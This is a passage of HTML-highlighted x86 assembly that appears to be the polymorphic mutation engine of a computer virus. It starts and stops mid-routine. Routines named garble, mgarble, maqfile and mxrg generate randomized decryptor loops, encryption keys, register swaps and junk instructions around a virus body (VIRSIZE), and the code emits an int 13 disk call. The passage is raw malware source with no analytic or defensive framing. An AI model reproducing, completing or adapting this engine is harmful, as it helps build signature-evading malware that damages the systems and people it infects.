       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">gtype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">gnf</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">@a8</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rgusg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mrval</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">@a9</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble</span><span class="sc0">                             </span><span class="sc1">;garble a bit more</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@a9</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@a8</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">013cdh</span><span class="sc0">                          </span><span class="sc1">;int 13</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">gtype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">gfl</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rgusg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1000b</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06</span><span class="sc0">                              </span><span class="sc1">;push es</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc0">                             </span><span class="sc1">;push bx</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cbh</span><span class="sc0">                            </span><span class="sc1">;retf</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mgarble</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                            </span><span class="sc1">;1-8 garbage calls</span><span class="sc0">
 </span><span class="sc5">@b9</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@b9</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">maqfile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">gtype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">gnf</span><span class="sc0">
 </span><span class="sc5">@c0</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@c0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cntreg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rgusg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111111111111b</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">VIRSIZE</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cntregv</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">@c1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011b</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">crtbl</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rgusg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@c1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pntreg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encintr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pntregv</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">strloop</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">encintr</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pntreg</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cntreg</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;inc counter</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f881h</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cntreg</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cntregv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0074h</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">strloop</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mgarble</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rgusg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pDOSBase</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

       </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pntregv</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mxrg</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">@c3</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@c4</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                           </span><span class="sc1">;randomize order</span><span class="sc0">
 </span><span class="sc5">@c4</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@c5</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
 </span><span class="sc5">@c5</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@c6</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
 </span><span class="sc5">@c6</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndf</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@c7</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">@c7</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@c3</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">garble</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maq</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">artm</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">artm</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;make a jump</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ebh</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">stosw</span><span class="sc0">
 </span><span class="sc5">ngrb</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">ngrb</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 </span><span class="sc5">artm</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">optbl</span><span class="sc0">
 </span><span class="sc5">@d1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
   </span><span class="sc5">gtype</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc5">gfl</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
   </span><span class="sc5">gnf</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0011b</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@d1</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;make aritm</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">opcode1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">opcode2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gopc</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">creg</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0111b</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@e1</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc5">@e1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rgusg</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">;used</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">gopc</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">
   </span><span class="sc5">opcode1</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0c0h</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@f1</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
 </span><span class="sc5">@f1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
